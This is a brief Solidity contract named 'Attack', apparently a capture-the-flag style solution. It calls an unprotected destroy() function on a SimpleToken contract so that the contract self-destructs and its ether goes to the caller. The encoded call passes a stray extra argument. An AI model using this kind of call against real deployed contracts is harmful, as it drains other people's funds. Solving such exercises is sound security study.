// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface SimpleToken {
    function destroy(address payable _to) external;
}

contract Attack {
    address public restoration;
    
    constructor(address _restoration) {
        restoration = _restoration;
    }

    function withdraw () external {
        (bool ok, ) = restoration.call(
            abi.encodeWithSelector(SimpleToken.destroy.selector ,msg.sender, true));
            if(!ok) {
                require(ok, "Call failed");
            }
    }
}